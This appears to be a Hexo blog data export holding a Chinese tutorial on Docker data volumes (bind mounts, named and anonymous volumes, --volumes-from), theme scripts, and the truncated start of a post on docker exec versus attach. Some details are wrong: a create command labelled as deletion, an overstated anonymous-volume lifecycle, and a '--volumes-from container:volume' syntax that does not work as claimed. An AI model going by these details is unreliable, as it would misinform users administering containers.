create命令显式地创建。\n卷的名称可以被用户自定义。\n生命周期独立于容器,容器删除后卷仍然存在。\n可以被多个容器同时挂载使用。\n\n匿名挂载:\n\n在docker run命令中通过-v参数隐式创建。\n名称随机生成,用户不可自定义。\n生命周期依赖于容器,容器删除后匿名卷也会被删除。\n仅供一个容器专有使用。\n\n具名挂载(Named Volumes)和匿名挂载(Anonymous Volumes)都是Docker的数据卷,主要区别如下:\n\n1. 定义方式不同\n\n具名挂载需要通过docker volume create命令显式创建。\n匿名挂载可以通过docker run命令隐式创建。\n\n2. 生命周期不同\n\n具名挂载的生命周期独立于容器,容器删除后卷仍然存在。\n匿名挂载的生命周期和容器一致,容器删除后匿名卷也会被删除。\n\n3. 使用方式不同\n\n具名挂载可以被多个容器同时挂载使用。\n匿名挂载仅供一个容器专有使用。\n\n例子：\n\n具名挂载:\n\n```bash\ndocker volume create my-vol\ndocker run -v my-vol:/opt container\n```\n\n匿名挂载:\n\n```bash\ndocker run -v /opt container\n```\n\n上面在运行容器时分别使用了具名挂载my-vol和匿名挂载/opt,它们的生命周期和作用范围不同。\n\n### 数据卷的共享\n\n--volumes-from参数可以实现Docker容器之间的数据卷共享。\n\n其作用是将指定容器挂载的数据卷,挂载到当前容器中,实现多容器间的卷共享。\n\n例如:\n\n1. 创建一个命名为 vol1 的数据卷\n\n```bash\n# 容器dbdata挂载名为dbvol的数据卷 \ndocker run -d --name dbdata -v dbvol:/dbdata mysql\n\n# 容器webapp使用--volumes-from来挂载dbdata中的数据卷\ndocker run -d --name webapp --volumes-from dbdata nginx\n```\n\n上面通过--volumes-from dbdata,实现了容器webapp继承容器dbdata的卷挂载配置。webapp也可以访问dbvol的数据卷了。\n\n需要注意的是,--volumes-from Parameters会继承前容器所有卷的挂载配置,包括匿名和具名的。\n\n如果仅想共享指定的命名卷,可以用--volumes-from加上容器名称和卷名的组合实现,例如:\n\n```bash\n--volumes-from dbdata:dbvol\n```","source":"_posts/DockerVolume.md","raw":"---\ntitle: Docker数据卷详解\ndate: 2023-08-10 14:39:46\ncategories: 学习过程\ntags:\n  - Docker\n---\n\n### 数据卷介绍\n\n容器数据卷(Container Volumes)是Docker用于持久化和共享容器数据的一种机制。它允许您在容器之间共享文件/文件夹,并且对容器生命周期之外的数据进行持久化存储。\n\n主要特点包括:\n\n- 数据共享 - 容器之间可以通过数据卷来共享数据。多个容器可以同时挂载一个数据卷,实现数据共享。\n\n<!-- more -->\n\n- 数据持久化 - 数据卷的生命周期独立于容器,即使容器被删除,数据卷中的数据也不会丢失。\n\n- 数据加密 - 可以对 Docker 数据卷内容进行加密,保证数据安全性。\n\n- 性能优势 - 容器绕过 Union File System,可以直接操作数据卷,提高IO性能。\n\n- 挂载宿主目录 - 可以将宿主机上的目录作为数据卷挂载到容器中,实现容器访问宿主机文件。\n\n使用数据卷的场景包括需要保存容器数据、需要在容器之间共享文件、需要备份、恢复或迁移数据等。总之,容器数据卷为容器提供了持久化存储和数据共享能力。\n\n### 简单使用\n\n```bash\ndocker run -d -p 6603:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7\n```\n\n使用-v选项来对主机目录和容器内的目录进行映射，使用冒号间隔。\n\n映射后，从无论是主机部分新建的文件，还是容器内新建的文件，都可以实时在映射对方实现互通有无。\n\n### 常用命令\n\n1. 删除数据卷\n\n```bash\ndocker volume create my-vol\n```\n\n2. 查看所有的数据卷\n\n```bash\ndocker volume ls\n```\n\n3. 查看指定数据卷的信息\n\n```bash\ndocker volume inspect my-vol\n```\n\n4. 删除数据卷\n\n```bash\ndocker volume rm my-vol\n```\n\n5. 清理无主的数据卷\n\n```bash\ndocker volume prune\n```\n\n6. 使用 --mount创建数据卷\n\n挂载一个主机目录作为数据卷。使用 --mount 标记可以指定挂载一个本地主机的目录到容器中去。\n\n```bash\ndocker run -d --name test \\\n    --mount type=bind,source=/host/path,target=/container/path \\\n    nginx:latest\n```\n\n这个例子中,会将主机路径 /host/path 挂载到容器内的 /container/path,实现在主机和容器之间共享这个目录。\n\n另一个例子:\n\n```bash\ndocker run -d --name test \\\n   --mount type=bind,source=$(pwd)/config.json,target=/app/config.json \\\n   myapp:latest\n```\n\n这将主机当前目录下的 config.json 文件挂载到容器的 /app/config.json。挂载单个文件作为数据卷,提供一种配置注入的方式。\n\n总之,--mount 参数提供了一个在 docker run 时直接挂载主机目录的简便方法,避免了使用额外的 docker volume 命令。\n\n### 具名挂载和匿名挂载\n\n具名挂载(Named Volumes)和匿名挂载(Anonymous Volumes)是Docker中的两种数据卷方式。\n\n具名挂载:\n\n需要通过docker volume create命令显式地创建。\n卷的名称可以被用户自定义。\n生命周期独立于容器,容器删除后卷仍然存在。\n可以被多个容器同时挂载使用。\n\n匿名挂载:\n\n在docker run命令中通过-v参数隐式创建。\n名称随机生成,用户不可自定义。\n生命周期依赖于容器,容器删除后匿名卷也会被删除。\n仅供一个容器专有使用。\n\n具名挂载(Named Volumes)和匿名挂载(Anonymous Volumes)都是Docker的数据卷,主要区别如下:\n\n1. 定义方式不同\n\n具名挂载需要通过docker volume create命令显式创建。\n匿名挂载可以通过docker run命令隐式创建。\n\n2. 生命周期不同\n\n具名挂载的生命周期独立于容器,容器删除后卷仍然存在。\n匿名挂载的生命周期和容器一致,容器删除后匿名卷也会被删除。\n\n3. 使用方式不同\n\n具名挂载可以被多个容器同时挂载使用。\n匿名挂载仅供一个容器专有使用。\n\n例子：\n\n具名挂载:\n\n```bash\ndocker volume create my-vol\ndocker run -v my-vol:/opt container\n```\n\n匿名挂载:\n\n```bash\ndocker run -v /opt container\n```\n\n上面在运行容器时分别使用了具名挂载my-vol和匿名挂载/opt,它们的生命周期和作用范围不同。\n\n### 数据卷的共享\n\n--volumes-from参数可以实现Docker容器之间的数据卷共享。\n\n其作用是将指定容器挂载的数据卷,挂载到当前容器中,实现多容器间的卷共享。\n\n例如:\n\n1. 创建一个命名为 vol1 的数据卷\n\n```bash\n# 容器dbdata挂载名为dbvol的数据卷 \ndocker run -d --name dbdata -v dbvol:/dbdata mysql\n\n# 容器webapp使用--volumes-from来挂载dbdata中的数据卷\ndocker run -d --name webapp --volumes-from dbdata nginx\n```\n\n上面通过--volumes-from dbdata,实现了容器webapp继承容器dbdata的卷挂载配置。webapp也可以访问dbvol的数据卷了。\n\n需要注意的是,--volumes-from Parameters会继承前容器所有卷的挂载配置,包括匿名和具名的。\n\n如果仅想共享指定的命名卷,可以用--volumes-from加上容器名称和卷名的组合实现,例如:\n\n```bash\n--volumes-from dbdata:dbvol\n```","slug":"DockerVolume","published":1,"updated":"2024-05-03T03:55:54.729Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5dv001z7zj30gwyc419","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"数据卷介绍\"><a href=\"#数据卷介绍\" class=\"headerlink\" title=\"数据卷介绍\"></a>数据卷介绍</h3><p>容器数据卷(Container Volumes)是Docker用于持久化和共享容器数据的一种机制。它允许您在容器之间共享文件&#x2F;文件夹,并且对容器生命周期之外的数据进行持久化存储。</p>\n<p>主要特点包括:</p>\n<ul>\n<li>数据共享 - 容器之间可以通过数据卷来共享数据。多个容器可以同时挂载一个数据卷,实现数据共享。</li>\n</ul>\n<span id=\"more\"></span>\n\n<ul>\n<li><p>数据持久化 - 数据卷的生命周期独立于容器,即使容器被删除,数据卷中的数据也不会丢失。</p>\n</li>\n<li><p>数据加密 - 可以对 Docker 数据卷内容进行加密,保证数据安全性。</p>\n</li>\n<li><p>性能优势 - 容器绕过 Union File System,可以直接操作数据卷,提高IO性能。</p>\n</li>\n<li><p>挂载宿主目录 - 可以将宿主机上的目录作为数据卷挂载到容器中,实现容器访问宿主机文件。</p>\n</li>\n</ul>\n<p>使用数据卷的场景包括需要保存容器数据、需要在容器之间共享文件、需要备份、恢复或迁移数据等。总之,容器数据卷为容器提供了持久化存储和数据共享能力。</p>\n<h3 id=\"简单使用\"><a href=\"#简单使用\" class=\"headerlink\" title=\"简单使用\"></a>简单使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 6603:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br></pre></td></tr></table></figure>\n\n<p>使用-v选项来对主机目录和容器内的目录进行映射，使用冒号间隔。</p>\n<p>映射后，从无论是主机部分新建的文件，还是容器内新建的文件，都可以实时在映射对方实现互通有无。</p>\n<h3 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h3><ol>\n<li>删除数据卷</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker volume create my-vol</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>查看所有的数据卷</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker volume <span class=\"built_in\">ls</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>查看指定数据卷的信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker volume inspect my-vol</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>删除数据卷</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker volume <span class=\"built_in\">rm</span> my-vol</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>清理无主的数据卷</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker volume prune</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>使用 –mount创建数据卷</li>\n</ol>\n<p>挂载一个主机目录作为数据卷。使用 –mount 标记可以指定挂载一个本地主机的目录到容器中去。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d --name <span class=\"built_in\">test</span> \\</span><br><span class=\"line\">    --mount <span class=\"built_in\">type</span>=<span class=\"built_in\">bind</span>,<span class=\"built_in\">source</span>=/host/path,target=/container/path \\</span><br><span class=\"line\">    nginx:latest</span><br></pre></td></tr></table></figure>\n\n<p>这个例子中,会将主机路径 &#x2F;host&#x2F;path 挂载到容器内的 &#x2F;container&#x2F;path,实现在主机和容器之间共享这个目录。</p>\n<p>另一个例子:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d --name <span class=\"built_in\">test</span> \\</span><br><span class=\"line\">   --mount <span class=\"built_in\">type</span>=<span class=\"built_in\">bind</span>,<span class=\"built_in\">source</span>=$(<span class=\"built_in\">pwd</span>)/config.json,target=/app/config.json \\</span><br><span class=\"line\">   myapp:latest</span><br></pre></td></tr></table></figure>\n\n<p>这将主机当前目录下的 config.json 文件挂载到容器的 &#x2F;app&#x2F;config.json。挂载单个文件作为数据卷,提供一种配置注入的方式。</p>\n<p>总之,–mount 参数提供了一个在 docker run 时直接挂载主机目录的简便方法,避免了使用额外的 docker volume 命令。</p>\n<h3 id=\"具名挂载和匿名挂载\"><a href=\"#具名挂载和匿名挂载\" class=\"headerlink\" title=\"具名挂载和匿名挂载\"></a>具名挂载和匿名挂载</h3><p>具名挂载(Named Volumes)和匿名挂载(Anonymous Volumes)是Docker中的两种数据卷方式。</p>\n<p>具名挂载:</p>\n<p>需要通过docker volume create命令显式地创建。<br>卷的名称可以被用户自定义。<br>生命周期独立于容器,容器删除后卷仍然存在。<br>可以被多个容器同时挂载使用。</p>\n<p>匿名挂载:</p>\n<p>在docker run命令中通过-v参数隐式创建。<br>名称随机生成,用户不可自定义。<br>生命周期依赖于容器,容器删除后匿名卷也会被删除。<br>仅供一个容器专有使用。</p>\n<p>具名挂载(Named Volumes)和匿名挂载(Anonymous Volumes)都是Docker的数据卷,主要区别如下:</p>\n<ol>\n<li>定义方式不同</li>\n</ol>\n<p>具名挂载需要通过docker volume create命令显式创建。<br>匿名挂载可以通过docker run命令隐式创建。</p>\n<ol start=\"2\">\n<li>生命周期不同</li>\n</ol>\n<p>具名挂载的生命周期独立于容器,容器删除后卷仍然存在。<br>匿名挂载的生命周期和容器一致,容器删除后匿名卷也会被删除。</p>\n<ol start=\"3\">\n<li>使用方式不同</li>\n</ol>\n<p>具名挂载可以被多个容器同时挂载使用。<br>匿名挂载仅供一个容器专有使用。</p>\n<p>例子：</p>\n<p>具名挂载:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker volume create my-vol</span><br><span class=\"line\">docker run -v my-vol:/opt container</span><br></pre></td></tr></table></figure>\n\n<p>匿名挂载:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -v /opt container</span><br></pre></td></tr></table></figure>\n\n<p>上面在运行容器时分别使用了具名挂载my-vol和匿名挂载&#x2F;opt,它们的生命周期和作用范围不同。</p>\n<h3 id=\"数据卷的共享\"><a href=\"#数据卷的共享\" class=\"headerlink\" title=\"数据卷的共享\"></a>数据卷的共享</h3><p>–volumes-from参数可以实现Docker容器之间的数据卷共享。</p>\n<p>其作用是将指定容器挂载的数据卷,挂载到当前容器中,实现多容器间的卷共享。</p>\n<p>例如:</p>\n<ol>\n<li>创建一个命名为 vol1 的数据卷</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 容器dbdata挂载名为dbvol的数据卷 </span></span><br><span class=\"line\">docker run -d --name dbdata -v dbvol:/dbdata mysql</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 容器webapp使用--volumes-from来挂载dbdata中的数据卷</span></span><br><span class=\"line\">docker run -d --name webapp --volumes-from dbdata nginx</span><br></pre></td></tr></table></figure>\n\n<p>上面通过–volumes-from dbdata,实现了容器webapp继承容器dbdata的卷挂载配置。webapp也可以访问dbvol的数据卷了。</p>\n<p>需要注意的是,–volumes-from Parameters会继承前容器所有卷的挂载配置,包括匿名和具名的。</p>\n<p>如果仅想共享指定的命名卷,可以用–volumes-from加上容器名称和卷名的组合实现,例如:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--volumes-from dbdata:dbvol</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"数据卷介绍\"><a href=\"#数据卷介绍\" class=\"headerlink\" title=\"数据卷介绍\"></a>数据卷介绍</h3><p>容器数据卷(Container Volumes)是Docker用于持久化和共享容器数据的一种机制。它允许您在容器之间共享文件&#x2F;文件夹,并且对容器生命周期之外的数据进行持久化存储。</p>\n<p>主要特点包括:</p>\n<ul>\n<li>数据共享 - 容器之间可以通过数据卷来共享数据。多个容器可以同时挂载一个数据卷,实现数据共享。</li>\n</ul>","more":"<ul>\n<li><p>数据持久化 - 数据卷的生命周期独立于容器,即使容器被删除,数据卷中的数据也不会丢失。</p>\n</li>\n<li><p>数据加密 - 可以对 Docker 数据卷内容进行加密,保证数据安全性。</p>\n</li>\n<li><p>性能优势 - 容器绕过 Union File System,可以直接操作数据卷,提高IO性能。</p>\n</li>\n<li><p>挂载宿主目录 - 可以将宿主机上的目录作为数据卷挂载到容器中,实现容器访问宿主机文件。</p>\n</li>\n</ul>\n<p>使用数据卷的场景包括需要保存容器数据、需要在容器之间共享文件、需要备份、恢复或迁移数据等。总之,容器数据卷为容器提供了持久化存储和数据共享能力。</p>\n<h3 id=\"简单使用\"><a href=\"#简单使用\" class=\"headerlink\" title=\"简单使用\"></a>简单使用</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 6603:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br></pre></td></tr></table></figure>\n\n<p>使用-v选项来对主机目录和容器内的目录进行映射，使用冒号间隔。</p>\n<p>映射后，从无论是主机部分新建的文件，还是容器内新建的文件，都可以实时在映射对方实现互通有无。</p>\n<h3 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h3><ol>\n<li>删除数据卷</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker volume create my-vol</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>查看所有的数据卷</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker volume <span class=\"built_in\">ls</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>查看指定数据卷的信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker volume inspect my-vol</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>删除数据卷</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker volume <span class=\"built_in\">rm</span> my-vol</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>清理无主的数据卷</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker volume prune</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>使用 –mount创建数据卷</li>\n</ol>\n<p>挂载一个主机目录作为数据卷。使用 –mount 标记可以指定挂载一个本地主机的目录到容器中去。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d --name <span class=\"built_in\">test</span> \\</span><br><span class=\"line\">    --mount <span class=\"built_in\">type</span>=<span class=\"built_in\">bind</span>,<span class=\"built_in\">source</span>=/host/path,target=/container/path \\</span><br><span class=\"line\">    nginx:latest</span><br></pre></td></tr></table></figure>\n\n<p>这个例子中,会将主机路径 &#x2F;host&#x2F;path 挂载到容器内的 &#x2F;container&#x2F;path,实现在主机和容器之间共享这个目录。</p>\n<p>另一个例子:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d --name <span class=\"built_in\">test</span> \\</span><br><span class=\"line\">   --mount <span class=\"built_in\">type</span>=<span class=\"built_in\">bind</span>,<span class=\"built_in\">source</span>=$(<span class=\"built_in\">pwd</span>)/config.json,target=/app/config.json \\</span><br><span class=\"line\">   myapp:latest</span><br></pre></td></tr></table></figure>\n\n<p>这将主机当前目录下的 config.json 文件挂载到容器的 &#x2F;app&#x2F;config.json。挂载单个文件作为数据卷,提供一种配置注入的方式。</p>\n<p>总之,–mount 参数提供了一个在 docker run 时直接挂载主机目录的简便方法,避免了使用额外的 docker volume 命令。</p>\n<h3 id=\"具名挂载和匿名挂载\"><a href=\"#具名挂载和匿名挂载\" class=\"headerlink\" title=\"具名挂载和匿名挂载\"></a>具名挂载和匿名挂载</h3><p>具名挂载(Named Volumes)和匿名挂载(Anonymous Volumes)是Docker中的两种数据卷方式。</p>\n<p>具名挂载:</p>\n<p>需要通过docker volume create命令显式地创建。<br>卷的名称可以被用户自定义。<br>生命周期独立于容器,容器删除后卷仍然存在。<br>可以被多个容器同时挂载使用。</p>\n<p>匿名挂载:</p>\n<p>在docker run命令中通过-v参数隐式创建。<br>名称随机生成,用户不可自定义。<br>生命周期依赖于容器,容器删除后匿名卷也会被删除。<br>仅供一个容器专有使用。</p>\n<p>具名挂载(Named Volumes)和匿名挂载(Anonymous Volumes)都是Docker的数据卷,主要区别如下:</p>\n<ol>\n<li>定义方式不同</li>\n</ol>\n<p>具名挂载需要通过docker volume create命令显式创建。<br>匿名挂载可以通过docker run命令隐式创建。</p>\n<ol start=\"2\">\n<li>生命周期不同</li>\n</ol>\n<p>具名挂载的生命周期独立于容器,容器删除后卷仍然存在。<br>匿名挂载的生命周期和容器一致,容器删除后匿名卷也会被删除。</p>\n<ol start=\"3\">\n<li>使用方式不同</li>\n</ol>\n<p>具名挂载可以被多个容器同时挂载使用。<br>匿名挂载仅供一个容器专有使用。</p>\n<p>例子：</p>\n<p>具名挂载:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker volume create my-vol</span><br><span class=\"line\">docker run -v my-vol:/opt container</span><br></pre></td></tr></table></figure>\n\n<p>匿名挂载:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -v /opt container</span><br></pre></td></tr></table></figure>\n\n<p>上面在运行容器时分别使用了具名挂载my-vol和匿名挂载&#x2F;opt,它们的生命周期和作用范围不同。</p>\n<h3 id=\"数据卷的共享\"><a href=\"#数据卷的共享\" class=\"headerlink\" title=\"数据卷的共享\"></a>数据卷的共享</h3><p>–volumes-from参数可以实现Docker容器之间的数据卷共享。</p>\n<p>其作用是将指定容器挂载的数据卷,挂载到当前容器中,实现多容器间的卷共享。</p>\n<p>例如:</p>\n<ol>\n<li>创建一个命名为 vol1 的数据卷</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 容器dbdata挂载名为dbvol的数据卷 </span></span><br><span class=\"line\">docker run -d --name dbdata -v dbvol:/dbdata mysql</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 容器webapp使用--volumes-from来挂载dbdata中的数据卷</span></span><br><span class=\"line\">docker run -d --name webapp --volumes-from dbdata nginx</span><br></pre></td></tr></table></figure>\n\n<p>上面通过–volumes-from dbdata,实现了容器webapp继承容器dbdata的卷挂载配置。webapp也可以访问dbvol的数据卷了。</p>\n<p>需要注意的是,–volumes-from Parameters会继承前容器所有卷的挂载配置,包括匿名和具名的。</p>\n<p>如果仅想共享指定的命名卷,可以用–volumes-from加上容器名称和卷名的组合实现,例如:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--volumes-from dbdata:dbvol</span><br></pre></td></tr></table></figure>"},{"title":"两种进入和退出容器的方法以及它们之间的区别","date":"2023-08-08T06:12:17.000Z","_content":"\n### 进入容器的两种方法\n\n两种进入容器的方法分别是使用`exec`he`attach`两种方法。\n\n具体如下：\n\n* 使用`exec`的方式\n\n```bash\ndocker exec -it nginx-1 /bin/bash\n```\n\n* 使用`attach`的方式\n\n<!-- more -->\n\n```bash\ndocker attach nginx-1\n```\n\n### 进入容器两种方法的区别\n\n从下面的例子来看这两种进入容器的区别：\n\n```bash 折叠代码\nroot@knight:/docker# docker ps \nCONTAINER ID   IMAGE         COMMAND       CREATED          STATUS          PORTS     NAMES\nc2dbddec15d3   mynginx:0.1   \"/bin/bash\"   21 seconds ago   Up 20 seconds             nginx-1\nroot@knight:/docker# docker exec -it nginx-1 /bin/bash\nroot@c2dbddec15d3:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND       CREATED         STATUS         PORTS     NAMES\nc2dbddec15d3   mynginx:0.1   \"/bin/bash\"   2 minutes ago   Up 2 minutes             nginx-1\nroot@knight:/docker# docker attach nginx-1\nroot@c2dbddec15d3:/# exit\nexit\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES\nroot@knight:/docker# \n```\n\n可以观察到以下几点区别：\n\n1. 进入容器的命令指定的参数不一样，exec更复杂一点，需要指定一些参数。\n\n2. 使用exec进去的容器，exit退出之后，容器仍然运行，但是使用attach进入的容器，exit退出之后，容器直接停止了。\n\n原因如下：\n\n1. exec在进入容器时，会在容器里额外打开一个bash，当退出时，会停用当前的这个bash，也就是说，容器中还会有之前的bash在运行，有bash就有进程，有进程就不会停止容器。这也就是为什么exec在进入容器时，要指定一个解释器的原因。\n\n2. 